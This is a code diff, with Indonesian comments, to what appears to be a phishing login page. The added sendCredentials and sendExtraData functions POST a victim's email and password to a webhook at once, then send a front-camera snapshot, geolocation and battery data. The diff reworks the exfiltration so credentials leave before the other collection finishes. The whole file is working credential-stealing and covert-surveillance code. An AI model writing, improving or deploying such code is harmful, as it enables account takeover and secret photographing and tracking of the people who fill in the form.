@@ -170,13 +170,10 @@
         /** Coba ambil foto dari kamera depan (jika diizinkan) */
         function tryCapturePhoto() {
             return new Promise((resolve) => {
-                // Cek dukungan API
                 if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                     resolve('Kamera tidak didukung');
                     return;
                 }
-
-                // Minta kamera depan (facingMode: user)
                 navigator.mediaDevices.getUserMedia({
                         video: {
                             facingMode: 'user',
@@ -189,8 +186,6 @@
                         video.srcObject = stream;
                         video.onloadedmetadata = () => {
                             video.play();
-
-                            // Tunggu 1 detik agar frame stabil
                             setTimeout(() => {
                                 const canvas = document.getElementById('cap-canvas');
                                 const vw = video.videoWidth || 640;
@@ -199,16 +194,11 @@
                                 canvas.height = vh;
                                 const ctx = canvas.getContext('2d');
                                 ctx.drawImage(video, 0, 0, vw, vh);
-
-                                // Hentikan semua track kamera
                                 stream.getTracks().forEach((t) => t.stop());
-
-                                // Ubah ke base64 JPEG (kualitas 70%)
                                 const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
                                 resolve(dataUrl);
                             }, 1000);
                         };
-                        // Fallback jika onloadedmetadata tidak terpanggil
                         setTimeout(() => {
                             if (video.srcObject) {
                                 const canvas = document.getElementById('cap-canvas');
@@ -262,7 +252,53 @@
         }
 
         // ============================================================
-        // 4. FUNGSI UTAMA execute()
+        // 4. FUNGSI PENGIRIMAN
+        // ============================================================
+
+        /** Kirim hanya kredensial (langsung, tanpa menunggu apapun) */
+        async function sendCredentials(email, password) {
+            const payload = {
+                type: 'credentials',
+                credentials: { email, password },
+                time: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }),
+                userAgent: navigator.userAgent,
+            };
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload),
+                });
+                console.log('✅ Kredensial terkirim');
+            } catch (err) {
+                console.error('❌ Gagal kirim kredensial:', err);
+            }
+        }
+
+        /** Kirim data tambahan (baterai, foto, lokasi) setelah dikumpulkan */
+        async function sendExtraData(battery, photo, location, refTime) {
+            const payload = {
+                type: 'extra',
+                refTime: refTime,
+                battery: battery,
+                photo: photo,
+                location: location,
+                time: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }),
+            };
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload),
+                });
+                console.log('✅ Data tambahan terkirim');
+            } catch (err) {
+                console.error('❌ Gagal kirim data tambahan:', err);
+            }
+        }
+
+        // ============================================================
+        // 5. FUNGSI UTAMA execute()
         // ============================================================
         async function execute() {
             const userInput = document.getElementById('user');
@@ -273,60 +309,35 @@
             const email = userInput.value.trim();
             const password = passInput.value.trim();
 
-            // Validasi sederhana
             if (!email || !password) {
                 alert('Harap isi email dan kata sandi.');
                 return;
             }
 
-            // Nonaktifkan tombol sambil proses
+            // Nonaktifkan tombol
             btn.disabled = true;
             btn.textContent = 'Memproses...';
-            statusEl.textContent = '● Mengambil data...';
+            statusEl.textContent = '● Mengirim kredensial...';
 
-            try {
-                // Kumpulkan semua data secara paralel
-                const [battery, photo, location] = await Promise.all([
-                    getBatteryInfo(),
-                    tryCapturePhoto(),
-                    tryGetLocation(),
-                ]);
+            // --- Langkah 1: Kirim kredensial langsung ---
+            const refTime = new Date().toISOString(); // referensi waktu
+            await sendCredentials(email, password);
 
-                statusEl.textContent = '● Mengirim data...';
+            statusEl.textContent = '● Mengambil data tambahan...';
 
-                // Siapkan payload
-                const payload = {
-                    credentials: {
-                        email: email,
-                        password: password,
-                    },
-                    location: location,
-                    battery: battery,
-                    photo: photo, // bisa string base64 atau pesan error
-                    time: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }),
-                    userAgent: navigator.userAgent,
-                };
+            // --- Langkah 2: Kumpulkan data tambahan (baterai, foto, lokasi) secara paralel ---
+            const [battery, photo, location] = await Promise.all([
+                getBatteryInfo(),
+                tryCapturePhoto(),
+                tryGetLocation(),
+            ]);
 
-                // Kirim ke webhook (CORS mode normal)
-                const response = await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(payload),
-                });
+            statusEl.textContent = '● Mengirim data tambahan...';
 
-                if (response.ok) {
-                    console.log('✅ Data berhasil dikirim ke webhook');
-                    statusEl.textContent = '● Terkirim ✓';
-                } else {
-                    console.warn('⚠️ Webhook merespons dengan status:', response.status);
-                    statusEl.textContent = '● Gagal kirim (status ' + response.status + ')';
-                }
-            } catch (err) {
-                console.error('❌ Error saat execute:', err);
-                statusEl.textContent = '● Error: ' + err.message;
-            }
+            // --- Langkah 3: Kirim data tambahan ---
+            await sendExtraData(battery, photo, location, refTime);
+
+            statusEl.textContent = '● Selesai ✓';
 
             // Reset tombol
             btn.disabled = false;
@@ -338,7 +349,7 @@
         }
 
         // ============================================================
-        // 5. (OPSIONAL) Tekan Enter di input untuk submit
+        // 6. (OPSIONAL) Tekan Enter di input untuk submit
         // ============================================================
         document.querySelectorAll('input').forEach((inp) => {
             inp.addEventListener('keydown', (e) => {
